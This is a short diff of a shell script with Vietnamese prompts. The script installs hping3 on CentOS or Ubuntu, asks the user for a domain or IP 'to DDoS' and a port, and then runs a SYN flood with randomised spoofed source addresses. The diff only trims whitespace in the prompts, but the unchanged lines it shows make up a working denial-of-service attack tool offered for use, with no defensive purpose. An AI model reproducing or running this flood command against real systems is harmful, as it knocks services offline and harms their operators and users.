@@ -14,9 +14,9 @@ if (`cat /etc/os-release | grep -q 'CentOS'`); then
                         sudo yum install hping3 -y
                 ;;
                 "Run")
-                        printf " Tên miền hoặc IP cần DDos : "
+                        printf "Tên miền hoặc IP cần DDos : "
                 read n
-                        printf " Port :"
+                        printf "Port :"
                 read m
                         hping3 -c 10000 -d 128 -S -w 64 -p $m --flood --rand-source $n
                 ;;
@@ -34,13 +34,13 @@ elif (`cat /etc/os-release | grep -q 'Ubuntu'`); then
                 do
                         case $menu2 in
                 "Setup")
-                        echo " Đang cài đặt Hping3.. "
+                        echo "Đang cài đặt Hping3.. "
                         sudo apt-get install hping3 -y
                 ;;
                 "Run")
-                        printf " Điền tên miền hoặc IP cần DDos : "
+                        printf "Điền tên miền hoặc IP cần DDos : "
                 read n
-                        printf " Port : "
+                        printf "Port : "
                 read m
                         hping3 -c 10000 -d 128 -S -w 64 -p $m --flood --rand-source $n
                 ;;
